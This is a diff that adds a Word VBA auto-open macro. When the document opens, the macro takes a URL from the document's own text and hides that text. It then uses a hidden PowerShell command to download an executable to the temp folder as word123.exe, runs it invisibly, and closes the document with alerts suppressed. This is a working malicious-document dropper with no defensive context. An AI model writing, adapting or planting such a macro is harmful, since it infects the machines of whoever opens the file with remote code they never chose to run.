@@ -1,0 +1,30 @@
+Private Sub Document_Open()
+    Dim url As String
+    Dim rng As Range
+    Dim tempFilePath As String
+    Dim shellCommand As String
+    Dim fso As Object
+    Dim fileExists As Boolean
+
+    Set rng = ActiveDocument.Content
+    url = rng.Text
+    rng.Font.Hidden = True
+
+    tempFilePath = Environ("TEMP") & "\word123.exe"
+    shellCommand = "cmd.exe /c powershell -Command ""(New-Object System.Net.WebClient).DownloadFile('" & url & "', '" & tempFilePath & "')"""
+    Shell shellCommand, vbHide
+
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    fileExists = False
+    
+    Do
+        fileExists = fso.FileExists(tempFilePath)
+        DoEvents
+    Loop Until fileExists
+
+    Shell "cmd.exe /c start """" """ & tempFilePath & """", vbHide
+
+    Application.DisplayAlerts = wdAlertsNone
+    ThisDocument.Close False
+    Application.DisplayAlerts = wdAlertsAll
+End Sub
